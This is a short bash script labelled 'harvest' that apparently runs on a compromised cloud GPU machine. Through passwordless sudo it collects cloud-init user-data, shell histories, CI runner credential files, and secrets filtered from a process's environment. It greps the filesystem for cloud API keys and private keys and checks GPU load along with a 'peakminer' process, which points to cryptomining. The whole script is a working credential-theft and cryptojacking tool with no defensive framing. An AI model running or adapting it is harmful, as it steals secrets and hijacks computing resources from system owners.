set +e
H=$(hostname -s); echo "== harvest $H $(date -u +%FT%TZ)"
echo '--- cloud'; sudo -n sh -c 'ls -la /var/lib/cloud/instance/ 2>/dev/null | head; echo "## user-data"; head -c 3000 /var/lib/cloud/instance/user-data.txt 2>/dev/null; echo; echo "## cinit-tail"; tail -40 /var/log/cloud-init-output.log 2>/dev/null'
echo '--- hist'; sudo -n sh -c 'for f in /root/.bash_history /home/ubuntu/.bash_history; do echo "## $f"; tail -30 "$f" 2>/dev/null; done'
echo '--- runner'; sudo -n sh -c 'ls -la /opt/ul-runner 2>/dev/null | head -12; echo "## .runner"; head -c 700 /opt/ul-runner/.runner 2>/dev/null; echo; echo "## .credentials"; head -c 500 /opt/ul-runner/.credentials 2>/dev/null'
echo '--- units'; systemctl list-units --all --no-legend 2>/dev/null | grep -iE 'runner|actions' | head -5; sudo -n sh -c 'ls /etc/systemd/system | grep -i runner; cat /etc/systemd/system/actions.runner* 2>/dev/null | head -25'
echo '--- env'; sudo -n sh -c 'tr "\0" "\n" < /proc/2175682/environ 2>/dev/null | grep -iE "token|key|secret|pass|api|url" | cut -c1-140'
echo '--- hunt'; sudo -n grep -rIlE 'ps_[A-Za-z0-9]{24,}|PAPERSPACE|LTAI[A-Za-z0-9]{8}|AKID[A-Za-z0-9]{10}|BEGIN [A-Z ]*PRIVATE KEY' /root /home/ubuntu /opt /etc /var/lib/cloud /srv 2>/dev/null | head -20
echo '--- gpu'; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,power.draw --format=csv,noheader; pgrep -af peakminer | head -3
echo '--- done'
